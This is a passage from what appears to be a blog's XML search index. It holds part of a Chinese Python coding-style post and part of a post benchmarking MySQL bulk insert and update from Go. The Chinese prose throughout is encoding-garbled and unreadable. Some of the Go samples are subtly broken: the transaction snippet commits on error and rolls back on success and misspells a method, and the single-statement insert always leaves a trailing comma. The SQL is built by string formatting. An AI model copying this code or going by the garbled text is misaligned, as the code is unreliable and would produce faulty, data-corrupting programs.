åˆ†éš”å¯¹è¯¥å‚æ•°çš„æè¿°.å¦‚æžœæè¿°å¤ªé•¿è¶…è¿‡äº†å•è¡Œ80å­—ç¬¦,ä½¿ç”¨2æˆ–è€…4ä¸ªç©ºæ ¼çš„æ‚¬æŒ‚ç¼©è¿›(ä¸Žæ–‡ä»¶å…¶ä»–éƒ¨åˆ†ä¿æŒä¸€è‡´). æè¿°åº”è¯¥åŒ…æ‹¬æ‰€éœ€çš„ç±»åž‹å’Œå«ä¹‰. å¦‚æžœä¸€ä¸ªå‡½æ•°æŽ¥å—foo(å¯å˜é•¿åº¦å‚æ•°åˆ—è¡¨)æˆ–è€…**bar (ä»»æ„å…³é”®å­—å‚æ•°), åº”è¯¥è¯¦ç»†åˆ—å‡ºfooå’Œ**bar. æ­£å¸¸è¿”å›ž: Returns/Yieldsæè¿°è¿”å›žå€¼çš„ç±»åž‹å’Œè¯­ä¹‰. å¦‚æžœå‡½æ•°è¿”å›žNone, è¿™ä¸€éƒ¨åˆ†å¯ä»¥çœç•¥. å¼‚å¸¸è¿”å›ž: Raises:åˆ—å‡ºä¸ŽæŽ¥å£æœ‰å…³çš„æ‰€æœ‰å¼‚å¸¸. 123456789101112131415161718192021222324252627282930def fetch_bigtable_rows(big_table, keys, other_silly_variable=None): """Fetches rows from a Bigtable. Retrieves rows pertaining to the given keys from the Table instance represented by big_table. Silly things may happen if other_silly_variable is not None. Args: big_table: An open Bigtable Table instance. keys: A sequence of strings representing the key of each table row to fetch. other_silly_variable: Another optional variable, that has a much longer name than the other args, and which does nothing. Returns: A dict mapping keys to the corresponding table row data fetched. Each row is represented as a tuple of strings. For example: &#123;'Serak': ('Rigel VII', 'Preparer'), 'Zim': ('Irk', 'Invader'), 'Lrrr': ('Omicron Persei 8', 'Emperor')&#125; If a key from the keys argument is missing from the dictionary, then that row was not found in the table. Raises: IOError: An error occurred accessing the bigtable.Table object. """ pass ç±»æ–‡æ¡£åŒç†ç±»ä¹Ÿéœ€è¦åšè¯¦å°½çš„æè¿°: è¯¥ç±»çš„ç›®çš„, ä»¥åŠæ¦‚è²Œæè¿° ç±»æœ‰å…¬å…±å±žæ€§(Attributes), éœ€è¦æè¿°å…¶æ„ä¹‰ æ³¨æ„äº‹é¡¹ ç»§æ‰¿object, å› ä¸ºobjectå®žçŽ°äº†ä¸€äº›å†…ç½®æ–¹æ³•,æ–¹ä¾¿å…¼å®¹ã€‚ 123456789101112131415161718class SampleClass(object): """Summary of class here. Longer class information.... Longer class information.... Attributes: likes_spam: A boolean indicating if we like SPAM or not. eggs: An integer count of the eggs we have laid. """ def __init__(self, likes_spam=False): """Inits SampleClass with blah.""" self.likes_spam = likes_spam self.eggs = 0 def public_method(self): """Performs operation blah.""" TODOæ³¨é‡Šå¦‚æžœç±»æˆ–è€…æ–¹æ³•ï¼Œå‡½æ•° æ²¡æœ‰å®žçŽ°å®Œæ•´åŠŸèƒ½, è¯·ä½¿ç”¨TODOæ ‡è®°, å¾ˆå¤šIDEéƒ½èƒ½æ‰¾åˆ°è¿™ä¸ªæ ‡è®°, æ–¹ä¾¿ä»¥åŽæ”¹è¿›, åˆ«ç•™å‘.12# TODO(kl@gmail.com): Use a "*" here for string repetition.# TODO(Zeke) Change this to use relations. è®¿é—®æŽ§åˆ¶åˆç†çš„è®¿é—®æŽ§åˆ¶ä¼šä½¿å¾—ä»£ç æ›´åŠ å¥å£® __slots__: æŽ§åˆ¶å¯¹è±¡å¯ä»¥ç»‘å®šçš„å±žæ€§, é¿å…å¯¹è±¡è¢«ä¸´æ—¶æ·»åŠ å±žæ€§ï¼Œé€ æˆå¯¹è±¡çš„ä¸å¯é¢„æœŸè¡Œä¸ºã€‚ @property: é€šè¿‡å±žæ€§è£…é¥°å™¨æŽ§åˆ¶å±žæ€§çš„è¯»å’Œå†™çš„è¡Œä¸º, é˜²æ­¢ä¸ç¬¦åˆè§„èŒƒæ•°æ®çš„å½•å…¥ã€‚ __æˆ–è€…_: ä½¿ç”¨ä¸‹åˆ’çº¿å¼€å¤´çš„å˜é‡ï¼Œä¸ºç§æœ‰å˜é‡(åªæ˜¯åˆ«åäº†, ä½ çœŸæƒ³è®¿é—®è¿˜æ˜¯æœ‰åŠžæ³•çš„, ä½†æ˜¯è¯·ä¸è¦è¿™æ ·åš)ã€‚ __all__: å¯¹äºŽfrom importæ¥è¯´, å¯¼å‡ºæŒ‡å®šå¯¹è±¡, é˜²æ­¢å¯¼å‡ºå…¨å±€å˜é‡ã€‚ æ³¨æ„: å¯¹æš´éœ²å‡ºåŽ»çš„å…±æœ‰å˜é‡è¯·æ…Žé‡, å› ä¸ºå¦‚æžœä½ æš´éœ²å‡ºåŽ»è¿‡ä¼š, ä¸‹æ¬¡åœ¨è°ƒæ•´å°±éœ€è¦è€ƒè™‘åˆ°å…¼å®¹æ€§äº†, æ‰€ä»¥ä¼˜å…ˆä½¿ç”¨ç§æœ‰å˜é‡(__æˆ–è€…_)ã€‚ 123456789101112131415class Student(object): __slots__ = ['birth', 'age'] @property def birth(self): return self._birth @birth.setter def birth(self, value): self._birth = value @property def age(self): return 2015 - self._birth å‘½åçº¦å®šPythonåº“çš„å‘½åçº¦å®šæœ‰ç‚¹æ··ä¹±ï¼Œä¸å¯èƒ½å®Œå…¨ä¸€è‡´ã€‚ä½†ä¾ç„¶æœ‰äº›æ™®éæŽ¨èçš„å‘½åè§„èŒƒçš„ã€‚æ–°çš„æ¨¡å—å’ŒåŒ… (åŒ…æ‹¬ç¬¬ä¸‰æ–¹çš„æ¡†æž¶) åº”è¯¥éµå¾ªè¿™äº›æ ‡å‡†ã€‚å¯¹ä¸åŒé£Žæ ¼çš„å·²æœ‰çš„åº“ï¼Œå»ºè®®ä¿æŒå†…éƒ¨çš„ä¸€è‡´æ€§ã€‚ åŒ…å’Œæ¨¡å—å: æ¨¡å—åè¦ç®€çŸ­ï¼Œå…¨éƒ¨ç”¨å°å†™å­—æ¯ï¼Œå¯ä½¿ç”¨ä¸‹åˆ’çº¿ä»¥æé«˜å¯è¯»æ€§ã€‚åŒ…åå’Œæ¨¡å—åç±»ä¼¼ï¼Œä½†ä¸æŽ¨èä½¿ç”¨ä¸‹åˆ’çº¿ ç±»å: éµå¾ªCapWordã€‚ å‡½æ•°å’Œæ–¹æ³•çš„å‚æ•°: å®žä¾‹æ–¹æ³•ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ â€˜selfâ€™ã€‚ç±»æ–¹æ³•ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ â€˜clsâ€™ã€‚å¦‚æžœå‡½æ•°çš„å‚æ•°åä¸Žä¿ç•™å…³é”®å­—å†²çªï¼Œé€šå¸¸åœ¨å‚æ•°ååŽåŠ ä¸€ä¸ªä¸‹åˆ’çº¿ã€‚ æ–¹æ³•åå’Œå®žä¾‹å˜é‡: åŒå‡½æ•°å‘½åè§„åˆ™ã€‚ éžå…¬å¼€æ–¹æ³•å’Œå®žä¾‹å˜é‡å¢žåŠ ä¸€ä¸ªå‰ç½®ä¸‹åˆ’çº¿ã€‚ ä¸ºé¿å…ä¸Žå­ç±»å‘½åå†²çªï¼Œé‡‡ç”¨ä¸¤ä¸ªå‰ç½®ä¸‹åˆ’çº¿æ¥è§¦å‘é‡æ•´ã€‚ç±»Fooå±žæ€§åä¸º__aï¼Œ ä¸èƒ½ä»¥ Foo.__aè®¿é—®ã€‚(æ‰§è‘—çš„ç”¨æˆ·è¿˜æ˜¯å¯ä»¥é€šè¿‡Foo._Foo__aã€‚) é€šå¸¸åŒå‰ç½®ä¸‹åˆ’çº¿ä»…è¢«ç”¨æ¥é¿å…ä¸ŽåŸºç±»çš„å±žæ€§å‘ç”Ÿå‘½åå†²çªã€‚ å‡½æ•°å: å‡½æ•°ååº”è¯¥ä¸ºå°å†™ï¼Œå¿…è¦æ—¶å¯ç”¨ä¸‹åˆ’çº¿åˆ†éš”å•è¯ä»¥å¢žåŠ å¯è¯»æ€§ã€‚ mixedCase(æ··åˆå¤§å°å†™)ä»…è¢«å…è®¸ç”¨äºŽå…¼å®¹æ€§è€ƒè™‘(å¦‚: threading.py)ã€‚ å¼‚å¸¸å: å¦‚æžœç¡®å®žæ˜¯é”™è¯¯ï¼Œéœ€è¦åœ¨ç±»åæ·»åŠ åŽç¼€ â€œErrorâ€ã€‚ å…¨å±€å˜é‡å: å˜é‡å°½é‡åªç”¨äºŽæ¨¡å—å†…éƒ¨ï¼Œçº¦å®šç±»ä¼¼å‡½æ•°ã€‚ å¯¹è®¾è®¡ä¸ºé€šè¿‡ â€œfrom M import â€ æ¥ä½¿ç”¨çš„æ¨¡å—ï¼Œåº”é‡‡ç”¨__all__æœºåˆ¶æ¥é˜²æ­¢å¯¼å…¥å…¨å±€å˜é‡ï¼›æˆ–è€…ä¸ºå…¨å±€å˜é‡åŠ ä¸€ä¸ªå‰ç½®ä¸‹åˆ’çº¿ã€‚ å¸¸é‡: å¸¸é‡é€šå¸¸åœ¨æ¨¡å—çº§å®šä¹‰,ç”±å¤§å†™å­—æ¯ç”¨ä¸‹åˆ’çº¿åˆ†éš”ç»„æˆã€‚æ¯”å¦‚æ‹¬MAX_OVERFLOWå’ŒTOTALã€‚ åˆç†çš„è®¾è®¡æŽ¥å£è®¾è®¡è€ƒè™‘ç±»çš„æ–¹æ³•å’Œå®žä¾‹å˜é‡(ç»Ÿç§°ä¸ºå±žæ€§)æ˜¯å¦å…¬å¼€ã€‚å¦‚æžœæœ‰ç–‘é—®ï¼Œé€‰æ‹©ä¸å…¬å¼€ï¼›æŠŠå…¶æ”¹ä¸ºå…¬å¼€æ¯”æŠŠå…¬å¼€å±žæ€§æ”¹ä¸ºéžå…¬å¼€è¦å®¹æ˜“ã€‚å…¬å¼€å±žæ€§å¯ä¾›æ‰€æœ‰äººä½¿ç”¨ï¼Œå¹¶é€šå¸¸å‘åŽå…¼å®¹ã€‚éžå…¬å¼€å±žæ€§ä¸ç»™ç¬¬ä¸‰æ–¹ä½¿ç”¨ã€å¯å˜ç”šè‡³è¢«ç§»é™¤ã€‚è¿™é‡Œä¸ä½¿ç”¨æœ¯è¯­â€privateâ€ï¼Œ Pythonä¸­æ²¡æœ‰å±žæ€§æ˜¯çœŸæ­£ç§æœ‰çš„ã€‚å¦ä¸€ç±»å±žæ€§æ˜¯å­ç±»API(åœ¨å…¶ä»–è¯­è¨€ä¸­é€šå¸¸ç§°ä¸º â€œprotectedâ€)ã€‚ ä¸€äº›ç±»è¢«è®¾è®¡ä¸ºåŸºç±»ï¼Œå¯ä»¥æ‰©å±•å’Œä¿®æ”¹ã€‚ è°¨è®°è¿™äº›PythonæŒ‡å—ï¼š å…¬å¼€å±žæ€§åº”è¯¥æ²¡æœ‰å‰å¯¼ä¸‹åˆ’çº¿ å¦‚æžœå…¬å¼€å±žæ€§åå’Œä¿ç•™å…³é”®å­—å†²çªï¼Œå¯ä»¥æ·»åŠ åŽç½®ä¸‹åˆ’çº¿ ç®€å•çš„å…¬å¼€æ•°æ®å±žæ€§ï¼Œæœ€å¥½åªå…¬å¼€å±žæ€§åï¼Œæ²¡æœ‰å¤æ‚çš„è®¿é—®/ä¿®æ”¹æ–¹æ³•ï¼Œpythonçš„Propertyæä¾›äº†å¾ˆå¥½çš„å°è£…æ–¹æ³•ã€‚ å¦‚æžœä¸å¸Œæœ›å­ç±»ä½¿ç”¨çš„å±žæ€§ï¼Œè€ƒè™‘ç”¨ä¸¤ä¸ªå‰ç½®ä¸‹åˆ’çº¿(æ²¡æœ‰åŽç½®ä¸‹åˆ’çº¿)å‘½å ä»»ä½•å‘åŽå…¼å®¹çš„ä¿è¯åªé€‚ç”¨äºŽå…¬å…±æŽ¥å£ã€‚ æ–‡æ¡£åŒ–çš„æŽ¥å£é€šå¸¸æ˜¯å…¬å…±çš„ï¼Œé™¤éžæ˜Žè¯´æ˜Žæ˜¯ä¸´æ—¶çš„æˆ–ä¸ºå†…éƒ¨æŽ¥å£ã€å…¶ä»–æ‰€æœ‰æŽ¥å£é»˜è®¤æ˜¯å†…éƒ¨çš„ã€‚ ä¸ºäº†æ›´å¥½åœ°æ”¯æŒå†…çœï¼Œæ¨¡å—è¦åœ¨__all__å±žæ€§åˆ—å‡ºå…¬å…±APIã€‚ å†…éƒ¨æŽ¥å£è¦æœ‰å‰ç½®ä¸‹åˆ’çº¿ã€‚ å¦‚æžœå‘½åç©ºé—´(åŒ…ã€æ¨¡å—æˆ–ç±»)æ˜¯å†…éƒ¨çš„ï¼Œé‡Œé¢çš„æŽ¥å£ä¹Ÿæ˜¯å†…éƒ¨çš„ã€‚ å¯¼å…¥åç§°åº”è§†ä¸ºå®žçŽ°ç»†èŠ‚ã€‚å…¶ä»–æ¨¡å—ä¸èƒ½é—´æŽ¥è®¿åå­—ï¼Œé™¤éžåœ¨æ¨¡å—çš„APIæ–‡æ¡£ä¸­æ˜Žç¡®è®°è½½ï¼Œå¦‚os.pathä¸­æˆ–åŒ…çš„__init__æš´éœ²äº†å­æ¨¡å—ã€‚ å‡½æ•°è®¾è®¡å½“æµç¨‹è¶³å¤Ÿç¹æ‚æ—¶ï¼Œå°±è¦è€ƒè™‘å‡½æ•°ï¼ŒåŠå¦‚ä½•å°†å‡½æ•°ç»„åˆåœ¨ä¸€èµ·ã€‚åœ¨Pythonä¸­åšå‡½æ•°è®¾è®¡ï¼Œä¸»è¦è€ƒè™‘åˆ°å‡½æ•°å¤§å°ã€èšåˆæ€§ã€è€¦åˆæ€§ä¸‰ä¸ªæ–¹é¢ï¼Œè¿™ä¸‰è€…åº”è¯¥å½’ç»“äºŽè§„åˆ’ä¸Žè®¾è®¡çš„èŒƒç•´ã€‚é«˜å†…èšã€ä½Žè€¦åˆåˆ™æ˜¯ä»»ä½•è¯­è¨€å‡½æ•°è®¾è®¡çš„æ€»ä½“åŽŸåˆ™ã€‚ å¦‚ä½•å°†ä»»åŠ¡åˆ†è§£æˆæ›´æœ‰é’ˆå¯¹æ€§çš„å‡½æ•°ä»Žè€Œå¯¼è‡´äº†èšåˆæ€§ å¦‚ä½•è®¾è®¡å‡½æ•°é—´çš„é€šä¿¡åˆ™åˆæ¶‰åŠåˆ°è€¦åˆæ€§ å¦‚ä½•è®¾è®¡å‡½æ•°çš„å¤§å°ç”¨ä»¥åŠ å¼ºå…¶èšåˆæ€§åŠé™ä½Žå…¶è€¦åˆæ€§ èšåˆ å®Œç¾Žçš„ç¨‹åºè®¾è®¡ï¼Œæ¯ä¸ªå‡½æ•°åº”è¯¥è€Œä¸”åªéœ€åšä¸€ä»¶äº‹ æ¯”å¦‚è¯´:æŠŠå¤§è±¡æ”¾è¿›å†°ç®±åˆ†ä¸‰æ­¥:æŠŠé—¨æ‰“å¼€ã€æŠŠå¤§è±¡æ”¾è¿›åŽ»ã€æŠŠé—¨å…³ä¸Šã€‚ è¿™æ ·å°±åº”è¯¥å†™ä¸‰ä¸ªå‡½æ•°è€Œä¸æ˜¯ä¸€ä¸ªå‡½æ•°æ‹¿æ‰€æœ‰çš„äº‹å…¨åšäº†ã€‚è¿™æ ·ç»“æž„æ¸…æ™°ï¼Œå±‚æ¬¡åˆ†æ˜Žï¼Œä¹Ÿå¥½ç†è§£ï¼ å¤§å° Pythonä»£ç ä»¥ç®€å•æ˜Žäº†è‘—ç§°ï¼Œä¸€ä¸ªè¿‡é•¿æˆ–è€…æœ‰ç€æ·±å±‚åµŒå¥—çš„å‡½æ•°å¾€å¾€æˆä¸ºè®¾è®¡ç¼ºé™·çš„å¾å…†ã€‚ å¦‚æžœé¡¹ç›®ä¸­è®¾è®¡çš„ä¸€ä¸ªå‡½æ•°éœ€è¦ç¿»é¡µæ‰èƒ½çœ‹å®Œçš„è¯ï¼Œå°±è¦è€ƒè™‘å°†å‡½æ•°æ‹†åˆ†äº†ã€‚ è€¦åˆ å‚æ•°ä¼ å…¥ï¼Œreturnç»“æžœ, è¿™æ ·åšå¯ä»¥è®©å‡½æ•°ç‹¬ç«‹äºŽå®ƒå¤–éƒ¨çš„ä¸œè¥¿ã€‚å‚æ•°å’Œreturnè¯­å¥å°±æ˜¯éš”ç¦»å¤–éƒ¨ä¾èµ–çš„æœ€å¥½çš„åŠžæ³•ã€‚ æ…Žç”¨å…¨å±€å˜é‡, å…¨å±€å˜é‡é€šå¸¸æ˜¯ä¸€ç§è¹©è„šçš„å‡½æ•°é—´çš„è¿›è¡Œé€šä¿¡çš„æ–¹å¼ã€‚å®ƒä¼šå¼•å‘ä¾èµ–å…³ç³»å’Œè®¡æ—¶çš„é—®é¢˜ï¼Œä»Žè€Œä¼šå¯¼è‡´ç¨‹åºè°ƒè¯•å’Œä¿®æ”¹çš„å›°éš¾ã€‚è€Œä¸”ä»Žä»£ç åŠæ€§èƒ½ä¼˜åŒ–æ¥è€ƒè™‘ï¼Œæœ¬åœ°å˜é‡è¿œæ¯”å…¨å±€å˜é‡å¿«ã€‚ é¿å…ä¿®æ”¹å¯å˜ç±»åž‹çš„å‚æ•°ï¼ˆæˆ–è€…ç›´æŽ¥é¿å…ä¼ å…¥å¯å˜ç±»åž‹çš„å‚æ•°ï¼Œè€Œä½¿ç”¨argsï¼Œ æˆ–è€…*kwargs æ”¶é›†ï¼‰Pythonæ•°æ®ç±»åž‹æ¯”å¦‚è¯´åˆ—è¡¨ã€å­—å…¸å±žäºŽå¯å˜å¯¹è±¡ã€‚åœ¨ä½œä¸ºå‚æ•°ä¼ é€’ç»™å‡½æ•°æ—¶ï¼Œæœ‰æ—¶ä¼šåƒå…¨å±€å˜é‡ä¸€æ ·è¢«ä¿®æ”¹ã€‚è¿™æ ·åšçš„åå¤„æ˜¯ï¼šå¢žå¼ºäº†å‡½æ•°ä¹‹é—´çš„è€¦åˆæ€§ï¼Œä»Žè€Œå¯¼è‡´å‡½æ•°è¿‡äºŽç‰¹æ®Šå’Œä¸å‹å¥½ã€‚ç»´æŠ¤èµ·æ¥ä¹Ÿå›°éš¾ã€‚è¿™ä¸ªæ—¶å€™å°±è¦è€ƒè™‘ä½¿ç”¨åˆ‡ç‰‡S[:]å’Œcopyæ¨¡å—ä¸­çš„copy()å‡½æ•°å’Œdeepcopy()å‡½æ•°æ¥åšä¸ªæ‹·è´ï¼Œé¿å…ä¿®æ”¹å¯å˜å¯¹è±¡ å‚è€ƒæ–‡æ¡£ PEP8å®˜æ–¹æ–‡æ¡£ PEP8ä¸­æ–‡ç¿»è¯‘ Google Pythoné£Žæ ¼æŒ‡å—]]></content>
      <categories>
        <category>å¼€å‘è¯­è¨€</category>
        <category>Python</category>
      </categories>
      <tags>
        <tag>pythonic</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[MySQLæ‰¹é‡æ›´æ–°ä¸Žæ’å…¥]]></title>
    <url>%2F2017%2F06%2F19%2Fmysql-performance-for-bulk-action%2F</url>
    <content type="text"><![CDATA[æœ€è¿‘ä¸€ç›´ä½¿ç”¨gormæ¥æ“ä½œæ•°æ®åº“, ä½†å½“é‡åˆ°ä¸€äº›æ‰¹é‡æ“ä½œæ—¶,æ„Ÿè§‰æ€§èƒ½å¾ˆå·®, åŽŸå› å¾ˆç®€å•, gormæ˜¯ä¸€æ¡ä¸€æ¡çš„æ‰§è¡Œçš„,æ•ˆçŽ‡å¾ˆä½Ž, æ‰€ä»¥å¯¹äºŽæ‰¹é‡æ“ä½œ, ç‰¹åˆ«æ˜¯å¯¹äºŽå¤§é‡recordéœ€è¦åˆ›å»ºæˆ–è€…ä¿®æ”¹æ—¶, ç›´æŽ¥ä½¿ç”¨SQL, æ‰æ˜¯æ­£ç¡®çš„é€‰æ‹©ã€‚ è°ƒæ•´MySQLé…ç½®(MariaDB10) bulk_insert_buffer_size: è°ƒæ•´æ‰¹é‡æ’å…¥ç¼“å†²ï¼Œ é»˜è®¤æ˜¯16M, ä¸ºäº†èƒ½æ”¯æŒæ›´å¤§æ•°æ®çš„æ‰¹é‡æ’å…¥, æŒ‰éœ€è°ƒæ•´, æˆ‘è¿™é‡Œè°ƒæ•´åˆ°128M net_buffer_length: å®¢æˆ·å‘å‡ºçš„SQLè¯­å¥æœŸæœ›çš„é•¿åº¦, é»˜è®¤æ˜¯16Kã€‚å¦‚æžœè¯­å¥è¶…è¿‡è¿™ä¸ªé•¿åº¦ï¼Œç¼“å†²åŒºè‡ªåŠ¨åœ°è¢«æ‰©å¤§ï¼Œç›´åˆ°max_allowed_packetä¸ªå­—èŠ‚, æˆ‘è°ƒæ•´åˆ°128K max_allowed_packet: ä¸€ä¸ªåŒ…çš„æœ€å¤§å°ºå¯¸, é»˜è®¤ä¹Ÿæ˜¯16Mã€‚æ¶ˆæ¯ç¼“å†²åŒºè¢«åˆå§‹åŒ–ä¸ºnet_buffer_lengthå­—èŠ‚ï¼Œä½†æ˜¯å¯åœ¨éœ€è¦æ—¶å¢žåŠ åˆ°max_allowed_packetä¸ªå­—èŠ‚, æˆ‘ä¹Ÿè°ƒæ•´åˆ°128M å°†è¿™äº›é…ç½®å†™å…¥MySQLçš„é…ç½®æ–‡ä»¶ä¸­123bulk_insert_buffer_size = 128Mnet_buffer_length = 128Kmax_allowed_packet = 128M ä»Žå¯MySQLæŸ¥çœ‹è¿™äº›å…¨å±€å˜é‡æ˜¯å¦ç”Ÿæ•ˆ12345678910111213141516171819202122232425262728293031Welcome to the MariaDB monitor. Commands end with ; or \g.Your MariaDB connection id is 142Server version: 10.1.21-MariaDB-1~jessie mariadb.org binary distributionCopyright (c) 2000, 2016, Oracle, MariaDB Corporation Ab and others.Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.MariaDB [(none)]&gt; show variables like "bulk_insert_buffer_size";+-------------------------+----------+| Variable_name | Value |+-------------------------+----------+| bulk_insert_buffer_size | 16777216 |+-------------------------+----------+1 row in set (0.00 sec)MariaDB [(none)]&gt; show variables like "net_buffer_length";+-------------------+-------+| Variable_name | Value |+-------------------+-------+| net_buffer_length | 16384 |+-------------------+-------+1 row in set (0.00 sec)MariaDB [(none)]&gt; show variables like "max_allowed_packet";+--------------------+----------+| Variable_name | Value |+--------------------+----------+| max_allowed_packet | 16777216 |+--------------------+----------+1 row in set (0.00 sec) ä½¿ç”¨äº‹åŠ¡æ‰¹é‡åˆ›å»ºå’Œä¿®æ”¹å¤šæ¡è®°å½•æ—¶, å¦‚æžœä½¿ç”¨äº†å¤šæ¡è¯­å¥, è¯·ä¸€å®šä½¿ç”¨äº‹ç‰©, å› ä¸ºè¿™äº›åŠ¨ä½œæ˜¯ä¸€ä¸ªäº‹ç‰©, é¿å…éƒ¨åˆ†æˆåŠŸ,éƒ¨åˆ†å¤±è´¥ é€ æˆæ•°æ®ä¸ä¸€è‡´çš„é—®é¢˜ã€‚12345678tx,_ := db.Begin() stm,_ := Tx.Preapare("insert into test values(?,null)") result,err := stm.Exec('123')if err != nil &#123; tx.Commit()&#125; else &#123; tx.Rollback()&#125; æ‰¹é‡æ’å…¥æ‰¹é‡æ’å…¥çš„æ–¹æ³•ä¸€èˆ¬åŒ…å«: ç›´æŽ¥å¾ªçŽ¯æä¾›(éžå¸¸ä¸æŽ¨è) åŸºäºŽäº‹ç‰©çš„å¾ªçŽ¯æäº¤ åˆ©ç”¨INSERT INTOçš„å¤šå€¼æ’å…¥è¯­å¥ è¿™é‡Œä»¥æ’å…¥10000æ¡æ•°æ®ä¸ºä¾‹è¿›è¡Œæµ‹è¯•, å…³äºŽä¸‹é¢çš„æµ‹è¯•ä»£ç è§: æµ‹è¯•ä»£ç å®Œæ•´ç¤ºä¾‹ ç›´æŽ¥å¾ªçŽ¯æäº¤123456789101112131415// ä½¿ç”¨Forå¾ªçŽ¯æ‰§è¡Œfunc forInsert() &#123; start := time.Now() stmt, err := db.Prepare(`INSERT user (user_name,user_age,user_sex) values (?,?,?)`) checkErr(err) for i := 0; i &lt; 10000; i++ &#123; name := "tony" + strconv.Itoa(i) _, err := stmt.Exec(name, i, 1) checkErr(err) &#125; delta := time.Now().Sub(start).String() fmt.Println("For Insert Total Time: ", delta)&#125; åŸºäºŽäº‹ç‰©å¾ªçŽ¯æäº¤12345678910111213141516171819202122232425262728// åœ¨ä¸€ä¸ªäº‹ç‰©å†…å¾ªçŽ¯æ‰§è¡Œfunc withTxInsert() &#123; start := time.Now() tx, err := db.Begin() checkErr(err) stmt, err := tx.Prepare(`INSERT user (user_name,user_age,user_sex) values (?,?,?)`) checkErr(err) for i := 0; i &lt; 10000; i++ &#123; name := "tony" + strconv.Itoa(i) _, err := stmt.Exec(name, i, 1) checkErr(err) &#125; if err != nil &#123; err := tx.Rollback() checkErr(err) return &#125; err = tx.Commit() checkErr(err) delta := time.Now().Sub(start).String() fmt.Println("Bulk With Transaction Insert Total Time: ", delta)&#125; æž„é€ æˆä¸€æ¡è¯­å¥æäº¤SQLæ ·ä¾‹: â€œINSERT INTO table (field1,field2,field3) VALUES (â€˜aâ€™,â€™bâ€™,â€™câ€™), (â€˜aâ€™,â€™bâ€™,â€™câ€™),(â€˜aâ€™,â€™bâ€™,â€™câ€™);â€12345678910111213141516171819202122232425262728// æž„é€ ä¸€æ¡Insertè¯­å¥æ‰¹é‡æäº¤func bulkoneInsert() &#123; start := time.Now() sql := "INSERT INTO `user` (`user_name`,`user_age`,`user_sex`) VALUES " for i := 0; i &lt; 10000; i++ &#123; name := "tony" + strconv.Itoa(i) if i &lt; 10000 &#123; sql += fmt.Sprintf("('%s','%d','%d'),", name, i, 1) &#125; else &#123; sql += fmt.Sprintf("('%s','%d','%d');", name, i, 1) &#125; &#125; // fmt.Println(sql) tx, err := db.Begin() checkErr(err) _, err = tx.Exec(sql) if err == nil &#123; tx.Commit() &#125; else &#123; fmt.Println(err) tx.Rollback() &#125; delta := time.Now().Sub(start).String() fmt.Println("Bulk One Insert Total Time: ", delta)&#125; æ€»ç»“æœ€å¯¹3ç§çŠ¶å†µçš„æ’å…¥æ—¶é—´æŽ’å: Ranking Function Name Time 1 bulkoneInsert 283.548003ms 2 withTxInsert 4.047390845s 3 forInsert 1m55.580310398s ç»“è®ºå¾ˆæ˜Žæ˜¾: æž„é€ ä¸€æ¡SQLæ’å…¥æ•ˆçŽ‡é«˜å¾ˆå¤š æ‰¹é‡æ›´æ–°æˆ‘ä»¬å¯ä»¥ä½¿ç”¨å¤šä¸ªUPDATEè¯­å¥æ‰¹é‡æäº¤, åŒæ—¶MySQLä¹Ÿæ”¯æŒä¸€ä¸ªSQLè¯­å¥æ‰¹é‡æ›´æ–°å¤šæ¡è®°å½•, æ ‡å‡†çš„SQLæ˜¯ä½¿ç”¨UPDATE WHENæ¥å®žçŽ°, é™¤æ­¤ä¹‹å¤– ä»–çš„SQLæ‰©å±•è¿˜æ”¯æŒINSERT INTO å’ŒREPLACE INTOç”¨äºŽrecordçš„æ‰¹é‡æ›´æ–°, ä½†æ˜¯æœ€å¥½åˆ«ç”¨REPLACE INTO, å› ä¸ºä»–æ˜¯å…ˆåˆ é™¤å†æ–°å¢ž, å› æ­¤æœ¬è´¨ä¸Šå®ƒä¸æ˜¯æ›´æ–°æ“ä½œ, å› ä¸ºåˆ é™¤åŽ, æ›´æ–°æ—¶ç¼ºå°‘æŸäº›å­—æ®µçš„è¯, ä¼šå¯¼è‡´æ•°æ®ä¸¢å¤±, è¿™åœ¨ä¸šåŠ¡ä¸Šæ˜¯ç»å¯¹ä¸å…è®¸çš„, è¯·è°¨æ…Žä½¿ç”¨ REPLACE INTOã€‚è€ŒINSERT INTOåˆ™ä¸ä¼šè¿™æ ·ã€‚ æœ€åŽä½¿ç”¨ä¸´æ—¶è¡¨ä¹Ÿèƒ½è¿›è¡Œæ‰¹é‡æ›´æ–°(å…ˆæ›´æ–°ä¸´æ—¶è¡¨ï¼Œç„¶åŽä»Žä¸´æ—¶è¡¨ä¸­update),æ•ˆçŽ‡ä¹Ÿç›¸å½“ä¸é”™,ä½†æ˜¯éœ€è¦ç”¨æˆ·æœ‰temporaryè¡¨çš„createæƒé™, å› æ­¤ä½¿ç”¨ä¹Ÿå—é™ã€‚æˆ‘ä¸€èˆ¬ä¼šä½¿ç”¨INSERT INTOæ¥æž„é€ æ‰¹é‡æ›´æ–°çš„SQL, å› ä¸ºè¯¥è¯­æ³•æ–¹ä¾¿æž„é€ , ä¸‹é¢ä¼šå¯¹å„ç§æ“ä½œåšç®€å•çš„æ€§èƒ½å¯¹æ¯”ã€‚ è¿™é‡Œä»¥æ›´æ–°10000æ¡æ•°æ®ä¸ºä¾‹è¿›è¡Œæµ‹è¯•(åŸºäºŽä¸Šé¢æ’å…¥çš„æ•°æ®), å…³äºŽä¸‹é¢çš„æµ‹è¯•ä»£ç è§: æµ‹è¯•ä»£ç å®Œæ•´ç¤ºä¾‹ å¾ªçŽ¯æ›´æ–°1234567891011121314151617181920212223242526272829// å¾ªçŽ¯æ›´æ–°// UPDATE table SET column1=?,column2=? WHERE column=?func withTxUpdate() &#123; start := time.Now() tx, err := db.Begin() checkErr(err) stmt, err := tx.Prepare("UPDATE `user` SET `user_name`=? WHERE `user_id`=?;") checkErr(err) for i := 0; i &lt; 10000; i++ &#123; name := "forupdate" + strconv.Itoa(i) _, err := stmt.Exec(name, i+1) checkErr(err) &#125; if err != nil &#123; err := tx.Rollback() checkErr(err) return &#125; err = tx.Commit() checkErr(err) delta := time.Now().Sub(start).String() fmt.Println("Bulk With Transaction Update Total Time: ", delta)&#125; æ ‡å‡†çš„UPDATEè¯­å¥æ‰¹é‡æ›´æ–°12345678910111213141516171819202122232425262728293031323334353637383940414243// æ ‡å‡†Updateè¯­å¥æ›´æ–°// UPDATE categories// SET dingdan = CASE id// WHEN 1 THEN 3// WHEN 2 THEN 4// WHEN 3 THEN 5// END,// title = CASE id// WHEN 1 THEN 'New Title 1'// WHEN 2 